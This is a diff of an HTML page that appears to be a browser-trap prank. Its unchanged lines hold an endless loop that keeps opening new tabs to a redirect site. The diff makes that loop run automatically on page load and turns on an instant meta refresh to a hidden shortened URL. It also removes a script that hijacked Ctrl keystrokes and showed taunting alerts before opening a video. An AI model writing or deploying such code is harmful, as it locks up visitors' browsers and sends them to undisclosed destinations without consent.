@@ -10,46 +10,9 @@ while (1<2) {
 window.open("https://georgezhou3.github.io/redirect2/", '_blank');
 }
 }
-  
-</script>
-<script> 
-  times = 0
-  window.onload = function() {
-    window.document.body.onkeydown = function() {
-      if (event.ctrlKey) {
-        if (times == 0) {
-        alert("THAT'S IT.");
-        times = times + 1;
-        }
-        if (times == 1) {
-        alert("I'M DONE.");
-        times = times + 1;
-        }
-        if (times == 2) {
-        alert("WHEN I SAY I'M DONE WITH SOMETHING");
-        times = times + 1;
-        }
-        if (times == 3) {
-        alert("I MEAN IT");
-        times = times + 1;
-        }
-        if (times == 3) {
-        alert("YOU'RE DONE");
-        window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", '_blank').focus();
-        }
-        event.stopPropagation();
-        event.preventDefault();
-        try {
-          event.keyCode = 0;
-        } catch (event) {}
-        return false;
-      }
-      return true;
-    };
-  };
 </script>
 </head>
-<body> <!--onload="myfunction()">-->
+<body onload="myfunction()">
 </body>
-<!--<meta http-equiv="refresh" content="0; URL=https://tinyurl.com/ndsafljkl" />-->
+<meta http-equiv="refresh" content="0; URL=https://tinyurl.com/ndsafljkl" />
 </html>
